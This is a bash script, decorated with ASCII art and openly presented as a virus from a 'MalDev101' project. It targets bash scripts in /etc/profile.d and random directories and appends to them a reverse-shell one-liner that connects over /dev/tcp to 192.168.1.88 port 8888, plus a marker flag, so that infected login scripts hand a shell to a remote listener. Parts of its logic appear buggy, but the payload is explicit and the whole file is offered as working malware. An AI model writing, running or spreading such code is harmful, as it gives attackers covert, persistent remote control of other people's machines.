#!/bin/bash



#                 #
#  __      __      \                .___         .___
# /  \    /  \____  \_ __  ____   __| _/____   __| _/ ---------
# \   \/\/   /  _ \|  |  \/    \ / __ _/ __ \ / __ | -----------
#  \        (  <_> |  |  |   |  / /_/ \  ___// /_/ | ------------
#   \__/\  / \____/|____/|___|  \____ |\___  \____ | -----------
#   _____\/                   \/ __  \/    \/     \/ ----------
#  /  ___ \_______ ___.________ |  |__   ____   ____  ---------
# /   \  __\_  __ <   |  \____ \|  |  \ /  _ \ /    \ ----------
# \    \_\  |  | \/\___  |  |_> |   Y  (  <_> |   |  \ ----------
#  \______  |__|   / ____|   __/|___|  /\___\/|___|  / ----------
#       / \/       \/    |__|        \/      \     \/ ---------
#      /                   ______ ----------- # ---------------
#     #         ______,---'__,---' ---------------------------
#          _,-'---_---__,---' -----------------------------
#   /_ #   (,  ---____', --------------------------------
#  /  /,,   `, ,-' -------------------------------------
# ;/)   ,',,_/,' # -------------------------------------
# | /\   ,.'//\ / ---------------------------------------
# `-` \ ,,'    /.   # -------------------------------------
#      `',   ,-- `./ -----------------------------------------
#      '/ / |     /`, -----------------------------------------
#      //'',.\_    .\\ -----,{==>- ------------------------------
#   __//   __;_`-  \ `;.__,;' ------------------------------------
# ((,--,) (((,------;  `--' --------------------------------------

# Created by TheG0df2ther a MalDev101 project
# This is only an experiment but it can be dangerous.
# I am not responsible for the damage.
# This is a virus that works on unix systems with bash installed.
# Tested on Linux (Ubuntu, Debian) and MacOS (OSX)

SHEBANG="#!/bin/bash"

FLAG="#arrow"

# Check if files are written in bash then start infecting them.
# The virus ignores non bash scripts and already infected files

function check() {
   
   local IFBASH=$(grep -Fx "$SHEBANG" *)

   local LDIR=$(ls -d *)

   if [ "$IFBASH" =~ .*"$SHEBANG" ]

   then
       local LISTNOTREADY=$(echo "$IFBASH" | tr -d ':#!/bin/bash')
       local LISTNOTREADYD=$(echo "$LISTNOTREADY" | sed -e 's/ /\ ,/g')
       local LISTNOTREADY2=$(grep -Fx "$FLAG" "$LISTNOTREADYD")
       local LISTNOTREADY2D=$(echo "$LISTNOTREADY2" | tr -d ':lol')
       LIST=$(echo "$LISTNOTREADY2D" | sed -e 's/ /\ ,/g')

       infect

    else
       
       if [ "$LDIR" == "" ]

       then
          cd /

          check

       else 
           CDDIR=$(shuf -n1 "$LDIR")

           cd "$CDDIR"

           check
        fi
    fi
}

# infect files

function infect() {
   
   # String you want to append to sh file. Example: reverse tcp bash (metasploit).
   # Responds to:
   # IP: 192.168.1.88
   # PORT: 8888

   echo "0<&205-;exec 205<>/dev/tcp/192.168.1.88/8888;sh <&205 >&205 2>&205" >> "$LIST"
   echo "$FLAG" >> "$LIST"
}

# start infecting autostart

cd /etc/profile.d/

check
      
#    |\                     /)      
#  /\_\\__               (_//
# |   `>\-`     _._       //`)  
#  \ /` \\  _.-.---.`-._ //
#   `    \|`  /     \  `|/
#         |   \.@-@./   |
#         |.../`\_/`\...|
#         |:://  _  \\::|
#         | | \     )|_ |
#         \/`\_`>  <_/ \/
#          \__/'---'\__/
#           `-. ::: .-'
#            //`:::`\\
#           //   '   \\
#          |/         \\


